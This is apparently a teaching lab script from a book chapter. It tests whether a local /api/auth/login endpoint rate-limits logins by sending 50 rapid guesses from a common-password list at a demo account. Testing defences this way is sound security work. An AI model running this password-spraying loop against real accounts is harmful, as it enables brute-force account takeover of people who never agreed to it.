#!/usr/bin/env bash
#
# Chapter 23 — Credential stuffing against /api/auth/login
#
# Send 50 login attempts in rapid succession against alice's account using
# common bad passwords. Tally the response codes:
#   - All 401: no rate limit. Attacker can try millions of passwords.
#   - First few 401, rest 429: rate limit working.

set -euo pipefail
API="${API:-http://localhost:8080}"
ATTEMPTS="${ATTEMPTS:-50}"

bold() { printf '\033[1m%s\033[0m\n' "$*"; }

bold "[1/2] Spray ${ATTEMPTS} login attempts at alice@example.com"
declare -A COUNTS=([200]=0 [401]=0 [429]=0 [other]=0)

PASSWORDS=(
  "password" "123456" "admin" "qwerty" "letmein" "welcome"
  "monkey" "dragon" "master" "trustno1" "iloveyou" "sunshine"
  "shadow" "abc123" "passw0rd" "1234567890" "alice" "alice123"
  "alice2024" "alice2025" "alice2026"
)

for i in $(seq 1 "$ATTEMPTS"); do
  pw="${PASSWORDS[$((i % ${#PASSWORDS[@]}))]}"
  CODE=$(curl -sS -o /dev/null -w '%{http_code}' \
    -X POST "${API}/api/auth/login" \
    -H 'Content-Type: application/json' \
    -d "{\"email\":\"alice@example.com\",\"password\":\"${pw}\"}")
  case "$CODE" in
    200|401|429) COUNTS[$CODE]=$((COUNTS[$CODE] + 1)) ;;
    *)           COUNTS[other]=$((COUNTS[other] + 1)) ;;
  esac
done
echo

bold "[2/2] Result"
echo "  200 (success):       ${COUNTS[200]}"
echo "  401 (bad password):  ${COUNTS[401]}"
echo "  429 (rate limited):  ${COUNTS[429]}"
echo "  other:               ${COUNTS[other]}"
echo

if [ "${COUNTS[429]}" -gt 0 ]; then
  bold "ATTACK BLOCKED — rate limit kicked in after a few attempts."
  echo "  An attacker with a credential-stuffing dump cannot brute force here."
elif [ "${COUNTS[401]}" -ge "$((ATTEMPTS - 5))" ]; then
  bold "ATTACK SUCCEEDED — server processed all ${ATTEMPTS} attempts with no rate limit."
  echo "  At this rate the attacker can try millions of passwords per hour."
  echo "  Combined with a leaked credential dump (Have I Been Pwned has 12B records)"
  echo "  this is a near-guaranteed account takeover."
  exit 1
else
  bold "Inconclusive — check the server is running and seeded."
fi
